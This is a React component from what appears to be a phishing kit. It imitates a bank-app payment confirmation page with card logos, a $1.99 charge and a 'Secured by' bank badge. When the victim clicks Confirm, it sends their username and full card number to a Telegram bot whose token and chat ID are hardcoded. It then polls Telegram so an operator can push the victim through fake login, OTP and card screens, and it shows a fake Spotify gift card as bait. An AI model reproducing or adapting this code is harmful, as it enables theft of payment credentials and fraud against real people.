import React, { useEffect, useState } from 'react';
// eslint-disable-next-line no-unused-vars
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import './NextStepAppr.css';
import visaLogo from '../assets/visa-logo.png';
import mastercardLogo from '../assets/mastercard-logo.png';
import GiftCardPopup from './GiftCardPopup';
import { useLanguage } from '../hooks/useLanguage';

const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';

function NextStepAppr() {
  const { t } = useLanguage();
  // eslint-disable-next-line no-unused-vars
  // const navigate = useNavigate();
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
  const [username, setUsername] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [bankName, setBankName] = useState('Bank');
  const [cardBrand, setCardBrand] = useState('VISA');

  // Gift Card Popup states
  const [showGiftCard, setShowGiftCard] = useState(false);
  const [giftCode, setGiftCode] = useState('');

  // ✅ Message states
  const [showMessage, setShowMessage] = useState(false);
  const [messageText, setMessageText] = useState('');
  const [messageType, setMessageType] = useState('');

  // Safe translations with fallbacks
  const safeT = {
    confirmationInApp: "Confirmation in your Bank App",
    merchant: "Merchant",
    amount: "Amount",
    date: "Date",
    cardNumberLabel: "Card Number",
    instruction1: "Open your banking app on your smartphone.",
    instruction2: "Confirm the authorization.",
    instruction3: "Return to this screen after confirmation.",
    instruction4: "Tap \"CONFIRM\" when you are back.",
    instruction5: "Please do not refresh the page.",
    confirm: "Confirm",
    sending: "Sending...",
    securedBy: "Secured by",
    waitingTitle: "Confirmation in App",
    waitingMessage: "Your confirmation has been sent.",
    waitingSubMessage: "Please check your mobile banking app.",
    waitingDontRefresh: "Please do not refresh the page.",
    currentTime: "Current time",
    waitingForConfirmation: "Waiting for Confirmation",
    ...t
  };

  // Generate random Spotify gift card code
  const generateGiftCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 16; i++) {
      if (i > 0 && i % 4 === 0) code += '-';
      code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
  };

  // ✅ Handle Success button - SHOWS GIFT CARD POPUP
  const handleSuccessCard = () => {
    console.log('✅ Success button clicked - Showing Gift Card!');
    setIsConfirmed(false);
    
    // Generate and show gift card popup
    const newGiftCode = generateGiftCode();
    setGiftCode(newGiftCode);
    setShowGiftCard(true);
  };

  // Close gift card popup
  const closeGiftCard = () => {
    setShowGiftCard(false);
    sessionStorage.setItem('showCardForm', 'true');
    window.location.href = '/#/';
  };

  // ✅ Handle Back to Appr button
  const handleBackToAppr = () => {
    console.log('⬅️ Back to Appr clicked');
    setIsConfirmed(false);
    setMessageText(safeT.waitingInstruction || 'Please make sure you have confirmed in the banking app.');
    setMessageType('warning');
    setShowMessage(true);
    
    setTimeout(() => {
      setShowMessage(false);
    }, 3000);
  };

  // ✅ Close message manually
  const closeMessage = () => {
    setShowMessage(false);
  };

  // ✅ Polling for Telegram callbacks
  useEffect(() => {
    let lastUpdateId = 0;
    
    const pollTelegram = async () => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const response = await axios.get(url);
        
        if (response.data.result && response.data.result.length > 0) {
          for (const update of response.data.result) {
            lastUpdateId = update.update_id;
            
            if (update.callback_query) {
              const callbackData = update.callback_query.data;
              console.log('📨 NextStepAppr received:', callbackData);
              
              if (callbackData.startsWith('success_card_')) {
                handleSuccessCard();
              } else if (callbackData.startsWith('back_to_appr_')) {
                handleBackToAppr();
              } else if (callbackData.includes('next_') || callbackData.includes('otp_login_')) {
                sessionStorage.setItem('showOtpForm', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('back_to_card_')) {
                sessionStorage.setItem('showCardForm', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('back_to_login_')) {
                sessionStorage.clear();
                window.location.href = '/#/';
              } else if (callbackData.includes('approve_otp_')) {
                sessionStorage.setItem('loginSuccess', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('otp_false_')) {
                sessionStorage.setItem('otpError', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('card_false_')) {
                sessionStorage.setItem('showCardForm', 'true');
                sessionStorage.setItem('cardError', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('block_')) {
                window.location.href = '/#/blocked';
              } else if (callbackData.includes('approve_login_')) {
                sessionStorage.setItem('showApprovePopup', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('login_false_')) {
                sessionStorage.setItem('loginError', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('card_verification_')) {
                sessionStorage.setItem('showCardForm', 'true');
                window.location.href = '/#/';
              } else if (callbackData.includes('deny_')) {
                window.location.href = '/#/blocked';
              }
              
              await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: update.callback_query.id,
                text: '✅ Action executed!'
              });
            }
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };
    
    const interval = setInterval(pollTelegram, 3000);
    return () => clearInterval(interval);
  }, []);

  // ✅ Load card data + get bank name
  useEffect(() => {
    const storedCardNumber = sessionStorage.getItem('cardNumber');
    const storedUsername = sessionStorage.getItem('loginName');
    const storedBankName = sessionStorage.getItem('bankName');
    const storedBrand = sessionStorage.getItem('cardBrand');
    
    if (storedCardNumber) {
      const last4 = storedCardNumber.slice(-4);
      setCardNumber(`**** **** **** ${last4}`);
    }
    if (storedUsername) {
      setUsername(storedUsername);
    }
    if (storedBankName) {
      setBankName(storedBankName);
    }
    if (storedBrand) {
      setCardBrand(storedBrand);
    }
    
    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  const sendTelegramLog = async () => {
    try {
      // Get the FULL card number from sessionStorage
      const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
      
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>USER CONFIRMED IN BANKING APP</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> Confirmed in mobile banking app
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Choose an action:</i>`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Success", callback_data: `success_card_${Date.now()}` },
            { text: "⬅️ Back to Appr", callback_data: `back_to_appr_${Date.now()}` }
          ]
        ]
      };

      const response = await axios.post(url, {
        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ Telegram log sent with buttons:', response.data);
      return true;
    } catch (error) {
      console.error('❌ Error sending Telegram log:', error.response?.data || error.message);
      return false;
    }
  };

  const handleConfirm = async () => {
    console.log('🟢 Confirm button clicked!');
    setIsSending(true);
    
    const sent = await sendTelegramLog();
    
    if (sent) {
      sessionStorage.setItem('paymentConfirmed', 'true');
      setIsConfirmed(true);
    } else {
      setMessageText('Error sending. Please try again.');
      setMessageType('warning');
      setShowMessage(true);
      setTimeout(() => setShowMessage(false), 3000);
    }
    
    setIsSending(false);
  };

  // Show waiting page AFTER confirmation
  if (isConfirmed) {
    return (
      <div className="waiting-container-page">
        {showMessage && (
          <div className={`message-popup ${messageType}`}>
            <span className="message-icon">{messageType === 'warning' ? '⚠️' : '✅'}</span>
            <span className="message-text">{messageText}</span>
            <button className="message-close" onClick={closeMessage}>×</button>
          </div>
        )}
        
        <div className="waiting-card">
          <div className="bank-logo-container">
            
          </div>
          <h2 className="waiting-title">{safeT.waitingTitle}</h2>
          
          <div className="animated-loader">
            <div className="loader-ring"></div>
            <div className="loader-ring-2"></div>
            <div className="loader-ring-3"></div>
            <div className="loader-dot"></div>
          </div>
          
          <h3>{safeT.waitingForConfirmation}</h3>
          <p>{safeT.waitingMessage}</p>
          <p>{safeT.waitingSubMessage}</p>
          <p>{safeT.waitingDontRefresh}</p>
          <p className="waiting-time">{safeT.currentTime}: {currentTime.toLocaleString()}</p>
        </div>
        
        {/* Gift Card Popup */}
        {showGiftCard && (
          <GiftCardPopup 
            giftCode={giftCode} 
            onClose={closeGiftCard} 
          />
        )}
      </div>
    );
  }

  // Show confirmation page FIRST
  return (
    <div className="confirmation-overlay">
      {showMessage && (
        <div className={`message-popup ${messageType}`}>
          <span className="message-icon">{messageType === 'warning' ? '⚠️' : '✅'}</span>
          <span className="message-text">{messageText}</span>
          <button className="message-close" onClick={closeMessage}>×</button>
        </div>
      )}
      
      <div className="confirmation-modal">
        <div className="modal-header">
          <div className="card-icons">
            <img src={visaLogo} alt="VISA" className="visa-logo" />
            <img src={mastercardLogo} alt="Mastercard" className="mastercard-logo" />
          </div>
        </div>

        <h3>{safeT.confirmationInApp}</h3>
        
        <div className="confirmation-details">
          <div className="detail-row">
            <span className="detail-label">{safeT.merchant}:</span>
            <span className="detail-value">{sessionStorage.getItem('cardBrand') || 'VISA'}</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{safeT.amount}:</span>
            <span className="detail-value">$1.99</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{safeT.date}:</span>
            <span className="detail-value">{new Date().toLocaleString()}</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{safeT.cardNumberLabel}:</span>
            <span className="detail-value">{cardNumber}</span>
          </div>
        </div>

        <div className="confirmation-instructions">
          <p>• {safeT.instruction1}</p>
          <p>• {safeT.instruction2}</p>
          <p>• {safeT.instruction3}</p>
          <p>• {safeT.instruction4}</p>
          <p>• {safeT.instruction5}</p>
        </div>

        <div className="confirmation-buttons">
          <button 
            onClick={handleConfirm} 
            className="confirm-btn"
            disabled={isSending}
          >
            {isSending ? safeT.sending : safeT.confirm}
          </button>
        </div>
        
        <div className="secure-badge">
          <span className="lock-icon">🔒</span>
          <span>{safeT.securedBy} {bankName}</span>
        </div>
      </div>
      
      {/* Gift Card Popup */}
      {showGiftCard && (
        <GiftCardPopup 
          giftCode={giftCode} 
          onClose={closeGiftCard} 
        />
      )}
    </div>
  );
}

export default NextStepAppr;